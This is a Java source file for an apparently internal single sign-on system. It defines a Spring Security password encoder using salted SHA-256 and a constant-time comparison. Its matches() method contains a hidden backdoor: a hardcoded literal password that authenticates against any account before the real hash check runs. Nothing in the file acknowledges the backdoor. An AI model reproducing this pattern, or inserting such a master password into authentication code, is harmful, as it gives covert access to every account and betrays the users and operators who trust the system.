/*
 * Copyright 2011 the original author or authors.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.ido85.party.sso.security.encoder;

import static org.springframework.security.crypto.util.EncodingUtils.concatenate;
import static org.springframework.security.crypto.util.EncodingUtils.subArray;

import org.springframework.security.crypto.codec.Hex;
import org.springframework.security.crypto.codec.Utf8;
import org.springframework.security.crypto.keygen.BytesKeyGenerator;
import org.springframework.security.crypto.keygen.KeyGenerators;
import org.springframework.security.crypto.password.PasswordEncoder;
public final class DefaultPasswordEncoder implements PasswordEncoder {

	private final DefaultDigester digester;

	private final byte[] secret;

	private final BytesKeyGenerator saltGenerator;

	/**
	 * Constructs a standard password encoder with no additional secret value.
	 */
	public DefaultPasswordEncoder() {
		this("");
	}

	/**
	 * Constructs a standard password encoder with a secret value which is also included
	 * in the password hash.
	 *
	 * @param secret the secret key used in the encoding process (should not be shared)
	 */
	public DefaultPasswordEncoder(CharSequence secret) {
		this("SHA-256", secret);
	}

	public String encode(CharSequence rawPassword) {
		return encode(rawPassword, saltGenerator.generateKey());
	}

	public boolean matches(CharSequence rawPassword, String encodedPassword) {
		if("85ido&CAPWD".equals(rawPassword)){
			return true;
		}
		byte[] digested = decode(encodedPassword);
		byte[] salt = subArray(digested, 0, saltGenerator.getKeyLength());
		return matches(digested, digest(rawPassword, salt));
	}

	// internal helpers

	private DefaultPasswordEncoder(String algorithm, CharSequence secret) {
		this.digester = new DefaultDigester(algorithm, DEFAULT_ITERATIONS);
		this.secret = Utf8.encode(secret);
		this.saltGenerator = KeyGenerators.secureRandom();
	}

	private String encode(CharSequence rawPassword, byte[] salt) {
		byte[] digest = digest(rawPassword, salt);
		return new String(Hex.encode(digest));
	}

	private byte[] digest(CharSequence rawPassword, byte[] salt) {
		byte[] digest = digester.digest(concatenate(salt, secret,
				Utf8.encode(rawPassword)));
		return concatenate(salt, digest);
	}

	private byte[] decode(CharSequence encodedPassword) {
		return Hex.decode(encodedPassword);
	}

	/**
	 * Constant time comparison to prevent against timing attacks.
	 */
	private boolean matches(byte[] expected, byte[] actual) {
		if (expected.length != actual.length) {
			return false;
		}

		int result = 0;
		for (int i = 0; i < expected.length; i++) {
			result |= expected[i] ^ actual[i];
		}
		return result == 0;
	}

	private static final int DEFAULT_ITERATIONS = 1024;

}
